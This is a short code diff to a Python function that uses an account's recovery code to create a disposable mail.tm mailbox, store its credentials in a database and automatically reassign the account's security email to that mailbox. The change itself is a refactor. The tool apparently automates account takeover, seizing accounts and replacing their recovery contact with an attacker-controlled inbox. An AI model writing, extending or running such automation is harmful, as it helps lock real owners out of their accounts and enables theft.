@@ -14,17 +14,17 @@ async def recoverySecure(email: str, recovery_code: str) -> dict:
 
     session = getSession()
 
-    security_email = uuid.uuid4().hex[:16]
+    sname = uuid.uuid4().hex[:16]
     password = uuid.uuid4().hex[:12]
 
-    email_token, security_email = await generateEmail(security_email, password)
-    print(f"[+] - Generated Security Email ({security_email}) and Password ({password})")
+    type, security_email = await generateEmail(sname, password)
+    print(f"[+] - Generated Security Email ({security_email})")
 
     with DBConnection() as database:
         database.addEmail(security_email, password)
-    
+
     print("[~] - Automaticly Securing Account...")
-    data = await recover(session, email, recovery_code, security_email, password, email_token)
+    data = await recover(session, email, recovery_code, security_email, password, type)
     print(data)
     if not data:
         return data
@@ -32,18 +32,7 @@ async def recoverySecure(email: str, recovery_code: str) -> dict:
     await getLiveData(session)
     await sendAuth(session, email)
 
-    token = await session.post(
-        url = "https://api.mail.tm/token",
-        headers = {
-            "Accept": "application/json",
-            "Content-Type": "application/json"
-        },
-        json = {
-            "address": security_email,
-            "password": password
-        }
-    )
-    code = await getEmailCode(token.json()["token"])
+    code = await getEmailCode(type)
 
     account = await startSecuringAccount(
         session = session,
